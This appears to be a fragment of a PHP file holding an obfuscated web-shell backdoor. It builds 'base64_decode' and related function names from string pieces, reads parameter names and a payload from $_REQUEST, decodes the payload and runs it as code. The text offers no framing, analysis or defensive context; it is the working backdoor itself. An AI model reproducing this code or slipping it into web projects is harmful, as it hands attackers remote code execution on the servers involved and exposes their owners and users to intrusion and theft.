...
$nj='iniwmjxlm35623n5v7dee5rs0nu68cdx';$sg='bas';$hu='sub';$us='function';$ga='st';$sg.='e64_d';$jh=$_REQUEST;$hu.='str';$us.='_exists';$sg.='ecode';$ga.='rtr';if(isset($jh[$hu($nj,13,$hu($nj,9,1))])){$ay=$jh[$hu($nj,20,$hu($nj,10,1))].$jh[$hu($nj,27,$hu($nj,11,1))];if($us($ay)){$yk=$ay('',$sg($ga($jh[$hu($nj,13,$hu($nj,9,1))],'-_,','+/=')));$yk();}}
